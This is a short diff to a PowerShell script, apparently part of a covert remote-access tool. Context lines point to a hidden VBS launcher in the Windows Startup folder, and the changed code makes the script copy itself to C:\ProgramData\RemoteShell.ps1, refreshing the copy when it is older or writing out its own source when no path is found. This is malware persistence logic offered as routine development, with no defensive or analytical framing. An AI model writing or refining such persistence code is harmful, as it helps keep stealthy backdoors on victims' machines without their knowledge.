@@ -7,10 +7,17 @@ $vbsPath = Join-Path $startupPath "RunHidden.vbs"
 # Ensure script persists in ProgramData
 $sourcePath = if ($PSCommandPath) { $PSCommandPath } else { $ps1Path }
 $persistentPath = "C:\ProgramData\RemoteShell.ps1"
-if (Test-Path $sourcePath -and $sourcePath -ne $persistentPath) {
-    Copy-Item -Path $sourcePath -Destination $persistentPath -Force
+if (Test-Path $sourcePath) {
+    if (-not (Test-Path $persistentPath) -or 
+        (Get-Item $sourcePath).LastWriteTime -gt (Get-Item $persistentPath).LastWriteTime) {
+        
+        Copy-Item -Path $sourcePath -Destination $persistentPath -Force
+        Write-Host "Copied $sourcePath to $persistentPath"
+    } else {
+        Write-Host "Persistent copy is up to date."
+    }
 } else {
-    Write-Warning "Source path not found or matches destination. Saving current script content to $persistentPath."
+    Write-Warning "Source path not found. Saving current script content to $persistentPath."
     $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
     Set-Content -Path $persistentPath -Value $scriptContent -Force
 }
